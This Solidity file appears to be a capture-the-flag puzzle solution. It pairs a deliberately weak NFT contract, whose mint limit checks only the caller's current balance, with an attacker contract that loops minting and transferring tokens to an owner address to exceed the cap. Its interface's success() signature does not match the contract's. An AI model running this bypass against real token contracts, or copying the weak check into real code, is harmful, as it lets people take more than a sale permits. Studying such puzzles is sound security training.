// SPDX-License-Identifier: GPL-3.0
pragma solidity >= 0.8.20 <0.9.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "forge-std/src/console2.sol";

contract Overmint2 is ERC721 {
    using Address for address;

    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") { }

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

interface IOvermint2 {
    function mint() external;
    function success(address _attacker) external view returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
}

contract Overmint2Attacker {
    IOvermint2 public overmint2;
    address public owner;

    constructor(address _overmint2, address _owner) {
        overmint2 = IOvermint2(_overmint2);
        owner = _owner;
    }

    function attack() external {
        while (overmint2.balanceOf(address(owner)) < 5) {
            console2.log(overmint2.balanceOf(address(owner)));
            overmint2.mint();
            overmint2.safeTransferFrom(address(this), owner, overmint2.totalSupply());
        }
    }
}
